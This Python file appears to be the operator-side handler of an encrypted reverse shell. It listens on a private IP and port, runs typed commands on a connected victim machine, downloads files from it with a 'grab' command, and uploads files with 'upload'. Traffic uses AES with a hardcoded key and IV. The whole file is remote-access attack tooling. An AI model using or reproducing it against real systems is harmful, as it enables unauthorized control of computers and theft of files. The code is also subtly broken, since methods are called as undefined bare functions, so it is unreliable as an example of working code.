import socket, os
from Cryptodome.Cipher import AES
from Cryptodome.Util import Padding

def main():
    reciever = Reciever('192.168.159.132', 8080)
    reciever.start()

class Reciever:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.IV = b"H" * 16
        self.key = b"H" * 32

    def start(self):
        try:
            self.connect()
            self.shell()
        except KeyboardInterrupt:
            try:
                send_encrypted(self.conn, 'kill'.encode())
                self.conn.close()
                self.sock.close()
                exit()
            except Exception:
                exit()

    def connect(self):
        self.sock = socket.socket()
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.ip, self.port))
        self.sock.listen(1)
        self.conn, self.addr = self.sock.accept()
        return print(f'[+] Connection recieved from {self.addr}')

    def shell(self):
        while True:
            command = input('>> ')
            if 'kill' in command:
                send_encrypted(self.conn, 'kill'.encode())
                self.conn.close()
                return
            if command.strip() == '':
                print('No command given...')
                continue
            if 'grab' in command:
                self.transfer(self.conn, command)
                continue
            if 'upload' in command:
                self.upload(self.conn, command)
                continue
            send_encrypted(self.conn, command.encode())
            print(recieve_and_decrypt(self.conn).decode())

    def transfer(self, conn, command):
        send_encrypted(conn, command.encode())
        grab, path = command.split('*')
        f = open(f'/root/Desktop/{path}', 'wb')
        while True:
            bits = recieve_and_decrypt(conn)
            if bits.endswith('DONE'.encode()):
                f.write(bits[:-4])
                f.close()
                print('[+] Transfer complete.')
                return
            if 'File not found.'.encode() in bits:
                print('[-] File not found.')
                return
            f.write(bits)

    def upload(self, conn, command):
        upload, path = command.split('*')
        if os.path.exists(path):
            f = open(path, 'rb')
            packet = f.read(1024)
            send_encrypted(conn, command.encode())
            while len(packet) > 0:
                send_encrypted(conn, packet)
                packet = f.read(1024)
            send_encrypted(conn, 'DONE'.encode())
            print('[+] Transfer complete.')
        else:
            print('File not found.')
        return

    def encrypt(self, message):
        encryptor = AES.new(self.key, AES.MODE_CBC, self.IV)
        padded_message = Padding.pad(message, 16)
        encrypted_message = encryptor.encrypt(padded_message)
        return encrypted_message

    def decrypt(self, cipher):
        decryptor = AES.new(self.key, AES.MODE_CBC, self.IV)
        decrypted_padded_message = decryptor.decrypt(cipher)
        decrypted_message = Padding.unpad(decrypted_padded_message, 16)
        return decrypted_message

    def send_encrypted(self, conn, message):
        enc_mess = self.encrypt(message)
        conn.send(enc_mess)

    def recieve_and_decrypt(self, conn):
        message = conn.recv(1024)
        decr_mess = self.decrypt(message)
        return decr_mess



if __name__ == '__main__':
    main()